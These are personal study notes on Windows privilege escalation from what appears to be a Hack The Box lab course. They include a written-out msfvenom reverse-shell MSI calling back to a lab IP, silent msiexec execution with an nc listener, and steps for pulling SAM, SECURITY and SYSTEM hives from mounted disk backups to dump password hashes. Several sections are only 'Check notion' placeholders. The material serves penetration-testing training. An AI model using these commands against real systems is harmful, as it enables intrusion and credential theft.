## Interacting with Users
SCF on a File Share
Check notion
## Pillaging
Understanding which applications are installed on our compromised system may help us achieve our goal during a pentest
The idea is to check for applications that can be exploited, the following are examples of applications that if you encounter you can check notion
```
mRemoteNG
```
```
Cookie Extraction from Firefox
```
```
Cookie Extraction from Chromium-based Browsers
```
```
Clipboard
```
```
Attacking Backup Servers
restic
```

## Miscellaneous Techniques
### Living Off The Land Binaries and Scripts (LOLBAS)
```
https://lolbas-project.github.io/#
```
### Encoding File with Certutil
```
C:\htb> certutil -encode file1 encodedfile
```
### Decoding File with Certutil
```
C:\htb> certutil -decode encodedfile file2
```
#### Summary
A binary such as rundll32.exe can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.
### Always Install Elevated
Enumerating Always Install Elevated Settings
```
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
```
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Our enumeration shows us that the AlwaysInstallElevated key exists, so the policy is indeed enabled on the target system
#### Generating MSI Package
```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```
#### Executing MSI Package
```
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```
#### Catching Shell
```
nc -lvnp 9443
```
### CVE-2019-1388
This vulnerability can be exploited easily using an old Microsoft-signed executable (hhupd.exe) that contains a certificate with the SpcSpAgencyInfo field populated with a hyperlink.
```
Look for hhupd.exe
```
Check notion
### Scheduled Tasks
Enumerating Scheduled Tasks
#### cmd
```
C:\htb>  schtasks /query /fo LIST /v
```
#### Enumerating Scheduled Tasks with PowerShell
```
PS C:\htb> Get-ScheduledTask | select TaskName,State
```
It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task
### Checking Permissions on C:\Scripts Directory
```
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
```
We notice various scripts in this directory, such as db-backup.ps1, mailbox-backup.ps1, etc., which are also all writeable by the BUILTIN\USERS group. At this point, we can append a snippet of code to one of these files with the assumption that at least one of these runs on a daily, if not more frequent, basis.
### Checking Local User Description Field
```
PS C:\htb> Get-LocalUser
```
### Enumerating Computer Description Field with Get-WmiObject Cmdlet
```
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
```
### Mount VHDX/VMDK
The tool Snaffler can help us perform thorough enumeration that we could not otherwise perform by hand. The tool searches for many interesting file types, such as files containing the phrase "pass" in the file name, KeePass database files, SSH keys, web.config files, and many more
Three specific file types of interest are .vhd, .vhdx, and .vmdk files. These are Virtual Hard Disk, Virtual Hard Disk v2 (both used by Hyper-V), and Virtual Machine Disk (used by VMware). Let's assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. We come across a backups share hosting a variety of .VMDK and .VHDX files whose filenames match hostnames in the network.
#### Linux
##### Mount VMDK on Linux
```
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```
##### Mount VHD/VHDX on Linux
```
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```
#### Windows
##### Mount VHD/VHDX
we can right-click on the file and choose Mount, or use the Disk Management utility to mount a .vhd or .vhdx file. If preferred, we can use the Mount-VHD PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.
##### Mount VMDK 
we can right-click and choose Map Virtual Disk from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation File --> Map Virtual Disks to map the disk onto our base system. 
We could also add the .vmdk file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use 7-Zip to extract data from a .vmdk file. This guide illustrates many methods for gaining access to the files on a .vmdk file.

Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the C:\Windows\System32\Config directory and pull down the SAM, SECURITY and SYSTEM registry hives. We can then use a tool such as secretsdump to extract the password hashes for local users.